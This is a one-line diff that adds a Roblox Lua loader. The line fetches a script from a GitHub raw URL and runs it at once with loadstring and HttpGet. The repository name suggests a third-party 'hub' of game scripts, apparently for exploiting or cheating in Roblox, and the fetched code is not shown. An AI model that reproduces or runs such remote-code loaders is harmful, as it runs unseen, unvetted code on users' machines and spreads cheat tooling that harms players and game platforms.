@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kaksakan/Kak.Hub-Reworked/main/2024/Refreshed/Best/Script"))()
